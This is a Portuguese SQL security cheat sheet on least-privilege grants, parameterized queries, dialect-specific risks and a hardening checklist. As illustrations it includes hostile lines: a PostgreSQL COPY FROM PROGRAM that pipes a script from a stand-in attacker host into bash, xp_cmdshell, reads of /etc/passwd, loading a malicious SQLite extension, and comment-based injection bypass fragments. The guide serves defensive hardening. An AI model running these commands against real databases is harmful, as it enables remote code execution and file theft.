# SQL — Cartão de Segurança (todos os dialetos)

> Cobre práticas universais + diferenças entre MySQL, PostgreSQL, MSSQL, SQLite, Oracle.

## Princípios universais

1. **Nunca concatenar input em SQL**. Sempre prepared statements.
2. **Identificadores** (tabela, coluna) por allowlist server-side, não input.
3. **Privilégios mínimos** — utilizador da app não deve ter `DROP`, `GRANT`, etc.
4. **TLS** em conexões DB — `sslmode=require` (Postgres), `--ssl` (MySQL).

## Permissões / GRANT

### Princípio do menor privilégio
```sql
-- BAD — app user com tudo
GRANT ALL PRIVILEGES ON *.* TO 'app'@'%';

-- GOOD — só o necessário
GRANT SELECT, INSERT, UPDATE, DELETE ON myapp.* TO 'app'@'10.0.0.%';
-- migrations correm com user separado:
GRANT ALL PRIVILEGES ON myapp.* TO 'app_migrate'@'10.0.0.5' IDENTIFIED BY '...';
```

### Read-only user para reports
```sql
CREATE USER 'reports'@'%' IDENTIFIED BY '...';
GRANT SELECT ON myapp.* TO 'reports'@'%';
```

### Revoke FILE / SUPER (MySQL)
```sql
-- FILE permite LOAD DATA INFILE → ler ficheiros do servidor
REVOKE FILE, SUPER, PROCESS ON *.* FROM 'app'@'%';
```

## Stored Procedures dinâmicos

```sql
-- BAD (MSSQL) — concatenação
DECLARE @sql NVARCHAR(MAX) = 'SELECT * FROM users WHERE name = ''' + @name + '''';
EXEC(@sql);

-- GOOD — sp_executesql com parâmetros
EXEC sp_executesql
    N'SELECT * FROM users WHERE name = @name',
    N'@name NVARCHAR(100)',
    @name = @name;
```

```sql
-- PostgreSQL — EXECUTE com USING
EXECUTE 'SELECT * FROM users WHERE name = $1' USING name_param;
```

## Comments / DML especiais

```sql
-- Atacante usa comments para bypass de filters
-- MySQL specific
1 UNION/*comment*/SELECT/**/...
1 UNION%23%0ASELECT  -- # é comentário, %0A é newline

-- Mitigação: parametrização (não filtragem) é a única defesa real
```

## Diferenças por dialeto

### MySQL / MariaDB
```sql
-- LIMIT com offset suspeito de SQLi blind
SELECT * FROM users LIMIT 1 OFFSET <controllable>;

-- LOAD DATA INFILE → leitura de ficheiros do server (FILE privilege)
LOAD_FILE('/etc/passwd')

-- Comentários: -- (com espaço!), #, /* */
-- Stack queries: por default DESATIVADAS (segurança histórica)
-- mas alguns drivers permitem com flag
```

### PostgreSQL
```sql
-- COPY FROM PROGRAM permite RCE se atacante tem permissão
COPY x FROM PROGRAM 'curl evil.tld/x.sh | bash';

-- pg_read_file (super user)
SELECT pg_read_file('/etc/passwd');

-- LISTEN/NOTIFY pode vazar info entre clientes
-- Stack queries: PERMITIDAS (cuidado com drivers)
-- Comentários: --, /* */
```

### MSSQL
```sql
-- xp_cmdshell — RCE clássica (geralmente off por default)
EXEC xp_cmdshell 'whoami';

-- OPENROWSET — leitura de ficheiros / SSRF
-- WAITFOR DELAY — time-based blind SQLi
WAITFOR DELAY '0:0:5';

-- Stack queries: PERMITIDAS por default
-- Comentários: --, /* */
```

### SQLite
```sql
-- ATTACH DATABASE → ficheiros arbitrários
ATTACH DATABASE '/etc/passwd' AS x;

-- load_extension → RCE se compilado com SQLITE_LOAD_EXTENSION
SELECT load_extension('/tmp/evil.so');

-- Geralmente runs em embedded — limitar permissões do processo
```

### Oracle
```sql
-- DBMS_LOB → leitura de ficheiros
-- UTL_HTTP → SSRF
-- DBMS_JAVA → execução Java
-- Definer rights vs Invoker rights — auditar PL/SQL packages
```

## Padrões em queries

### `LIKE` com wildcards do utilizador
```sql
-- BAD
WHERE name LIKE '%' || $1 || '%'  -- input "%admin%" muda meaning

-- GOOD — escapar wildcards
WHERE name LIKE $1 ESCAPE '\'
-- bind: '%' || REPLACE(REPLACE(input, '\', '\\'), '%', '\%') || '%'
```

### `IN (...)` dinâmico
```sql
-- BAD
WHERE id IN (1, 2, 3, 4)  -- onde array vem do user concatenado

-- GOOD — placeholders dinâmicos
WHERE id IN ($1, $2, $3, $4)  -- gerados server-side
-- Postgres alternativa
WHERE id = ANY($1)  -- bind array
```

### `ORDER BY` dinâmico
```sql
-- BAD
ORDER BY <user_input>

-- GOOD — allowlist
SELECT
    CASE WHEN $1 = 'name'  THEN name  END,
    CASE WHEN $1 = 'date'  THEN created_at END
ORDER BY 1, 2;
-- ou validar server-side
```

### `LIMIT` / `OFFSET` em paginação
```sql
-- Cap server-side
LIMIT LEAST($1, 100)
```

## Schema / Migrations

### Tipos defensivos
```sql
-- BAD
email VARCHAR(20)  -- truncation bypass se app valida 100 chars

-- GOOD
email VARCHAR(254)         -- RFC max
phone VARCHAR(20)          -- E.164 max
ip_address INET            -- Postgres tipo nativo
```

### Constraints
```sql
-- Sempre NOT NULL onde aplicável
email VARCHAR(254) NOT NULL UNIQUE,
created_at TIMESTAMPTZ NOT NULL DEFAULT NOW(),

-- Foreign keys (anti-IDOR)
CREATE TABLE posts (
    id BIGSERIAL PRIMARY KEY,
    user_id BIGINT NOT NULL REFERENCES users(id) ON DELETE CASCADE,
    title TEXT NOT NULL
);

-- Check constraints
quantity INT NOT NULL CHECK (quantity > 0),
amount DECIMAL(10,2) NOT NULL CHECK (amount >= 0)
```

### Charset
```sql
-- MySQL — sempre utf8mb4 (utf8 antigo só suporta 3 bytes)
CREATE DATABASE myapp CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci;

-- Tabelas
CREATE TABLE users (...) DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
```

### Encryption at rest
- TDE (Transparent Data Encryption) em MSSQL/Oracle.
- Postgres: `pgcrypto` para columns sensíveis.
- MySQL: InnoDB encryption.
- Cloud: AWS RDS encryption, Azure SQL TDE.

## Auditing

```sql
-- MySQL audit log (Enterprise) ou Percona Audit Plugin
-- Postgres pgaudit extension
-- MSSQL Audit
-- Oracle Unified Auditing
```

## Quick wins

- [ ] App user com privilégios mínimos (sem DROP/GRANT/CREATE em prod)
- [ ] User separado para migrations
- [ ] FILE/SUPER/xp_cmdshell revogados
- [ ] TLS obrigatório em conexões (`sslmode=require`)
- [ ] Charset `utf8mb4` (MySQL/MariaDB)
- [ ] NOT NULL + CHECK constraints + FOREIGN KEYs em colunas críticas
- [ ] Tipos de coluna apropriados (sem `VARCHAR(20)` para email)
- [ ] Backups encriptados
- [ ] Encryption at rest ativo
- [ ] Slow query log para detetar SQLi attempts
- [ ] Audit log para eventos críticos (DDL, GRANTs)
- [ ] DB privileges não permitem `LOAD DATA INFILE` se não usado
- [ ] DB privileges não permitem `COPY ... PROGRAM` (Postgres)
- [ ] Acesso DB restrito a IPs específicos / VPC privada
